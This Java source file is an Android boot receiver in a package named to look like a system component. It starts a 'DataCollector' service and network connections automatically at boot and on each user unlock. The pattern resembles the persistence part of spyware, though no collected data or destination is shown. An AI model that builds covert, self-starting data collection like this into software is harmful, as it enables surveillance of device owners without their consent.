package com.android.systemcore.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.android.systemcore.service.DataCollector;
import com.android.systemcore.network.NetworkManager;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() == null) {
            return;
        }
        
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Log.d(TAG, "Boot completed, starting services");
            
            try {
                // Start the data collection service
                Intent serviceIntent = new Intent(context, DataCollector.class);
                serviceIntent.setAction("com.android.systemcore.START_COLLECTION");
                context.startService(serviceIntent);
                
                // Initialize network manager
                NetworkManager networkManager = NetworkManager.getInstance(context);
                networkManager.initialize();
                networkManager.checkConnection();
                
                Log.d(TAG, "Services started successfully");
            } catch (Exception e) {
                Log.e(TAG, "Error starting services: " + e.getMessage());
            }
        } else if (intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
            // Additional trigger on user unlock
            Log.d(TAG, "User present, ensuring services are running");
            NetworkManager.getInstance(context).ensureConnection();
        }
    }
}